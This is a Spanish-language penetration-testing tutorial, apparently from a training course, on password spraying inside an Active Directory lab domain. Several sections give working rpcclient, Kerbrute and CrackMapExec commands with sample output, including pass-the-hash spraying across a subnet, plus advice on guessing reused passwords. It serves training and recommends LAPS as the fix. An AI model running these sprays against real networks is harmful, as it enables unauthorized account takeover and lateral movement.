Ahora que hemos creado una lista de palabras usando uno de los métodos descritos en las secciones anteriores, es hora de ejecutar nuestro ataque. Las siguientes secciones nos permitirán practicar Password Spraying desde hosts Linux y Windows. Este es un enfoque clave para nosotros, ya que es una de las dos principales vías para obtener credenciales de dominio para el acceso, pero también una en la que debemos proceder con cautela.

---

## Internal Password Spraying from a Linux Host

Una vez que hemos creado una lista de palabras usando uno de los métodos mostrados en la sección anterior, es hora de ejecutar el ataque. `Rpcclient` es una excelente opción para realizar este ataque desde Linux. Una consideración importante es que un inicio de sesión válido no es inmediatamente aparente con `rpcclient`, con la respuesta `Authority Name` indicando un inicio de sesión exitoso. Podemos filtrar los intentos de inicio de sesión inválidos buscando `Authority` en la respuesta. El siguiente one-liner de Bash (adaptado de [aquí](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) se puede usar para realizar el ataque.

### Using a Bash one-liner for the Attack

```r
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Probemos esto en el entorno objetivo.

```r
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

También podemos usar `Kerbrute` para el mismo ataque como se discutió anteriormente.

### Using Kerbrute for the Attack

```r
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Hay múltiples otros métodos para realizar password spraying desde Linux. Otra gran opción es usar `CrackMapExec`. La herramienta siempre versátil acepta un archivo de texto de nombres de usuario para ser ejecutado contra una sola contraseña en un ataque de spraying. Aquí buscamos `+` para filtrar los fallos de inicio de sesión y centrarnos solo en los intentos de inicio de sesión válidos para asegurarnos de no perder nada al desplazarnos por muchas líneas de salida.

### Using CrackMapExec & Filtering Logon Failures

```r
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Después de obtener uno (¡o más!) éxitos con nuestro ataque de password spraying, podemos usar `CrackMapExec` para validar rápidamente las credenciales contra un Domain Controller.

### Validating the Credentials with CrackMapExec

```r
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

---

## Local Administrator Password Reuse

El password spraying interno no solo es posible con cuentas de usuario del dominio. Si obtienes acceso administrativo y el hash de la contraseña NTLM o la contraseña en texto claro para la cuenta de administrador local (u otra cuenta local privilegiada), esto se puede intentar en múltiples hosts en la red. El reuso de contraseñas de cuentas de administrador local es común debido al uso de imágenes doradas en despliegues automatizados y la aparente facilidad de gestión al imponer la misma contraseña en múltiples hosts.

CrackMapExec es una herramienta útil para intentar este ataque. Vale la pena apuntar a hosts de alto valor como `SQL` o servidores de `Microsoft Exchange`, ya que es más probable que tengan un usuario altamente privilegiado conectado o que sus credenciales persistan en la memoria.

Cuando trabajamos con cuentas de administrador local, una consideración es el reuso de contraseñas o formatos comunes de contraseñas en las cuentas. Si encontramos un host de escritorio con la contraseña de la cuenta de administrador local configurada a algo único como `$desktop%@admin123`, podría valer la pena intentar `$server%@admin123` en los servidores. Además, si encontramos cuentas de administrador local no estándar como `bsmith`, podríamos encontrar que la contraseña se reutiliza para una cuenta de usuario del dominio con un nombre similar. El mismo principio puede aplicarse a las cuentas de dominio. Si recuperamos la contraseña de un usuario llamado `ajones`, vale la pena intentar la misma contraseña en su cuenta de administrador (si el usuario tiene una), por ejemplo, `ajones_adm`, para ver si están reutilizando sus contraseñas. Esto también es común en situaciones de confianza de dominio. Podemos obtener credenciales válidas para un usuario en el dominio A que sean válidas para un usuario con el mismo nombre o similar en el dominio B o viceversa.

A veces solo podemos recuperar el hash NTLM para la cuenta de administrador local desde la base de datos local SAM. En estos casos, podemos realizar un spray del hash NT en todo un subred (o múltiples subredes) para buscar cuentas de administrador local con la misma contraseña configurada. En el ejemplo a continuación, intentamos autenticarnos en todos los hosts en una red /23 usando el hash NT de la cuenta de administrador local incorporada recuperada de otra máquina. El flag `--local-auth` indicará a la herramienta que intente iniciar sesión solo una vez en cada máquina, lo que elimina cualquier riesgo de bloqueo de cuenta. `Asegúrate de que este flag esté configurado para no bloquear potencialmente al administrador incorporado para el dominio`. Por defecto, sin la opción de autenticación local configurada, la herramienta intentará autenticarse usando el dominio actual, lo que podría resultar rápidamente en bloqueos de cuenta.

### Local Admin Spraying with CrackMapExec

```r
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

La salida anterior muestra que las credenciales eran válidas como administrador local en `3` sistemas en la subred `172.16.5.0/23`. Luego podríamos movernos para enumerar cada sistema y ver si podemos encontrar algo que nos ayude a avanzar en nuestro acceso.

Esta técnica, aunque efectiva, es bastante ruidosa y no es una buena opción para cualquier evaluación que requiera sigilo. Siempre vale la pena buscar este problema durante las pruebas de penetración, incluso si no es parte de nuestro camino para comprometer el dominio, ya que es un problema común y debe ser destacado para nuestros clientes. Una forma de remediar este problema es usar la herramienta gratuita de Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) para que Active Directory gestione las contraseñas de administrador local y haga cumplir una contraseña única en cada host que rote en un intervalo establecido.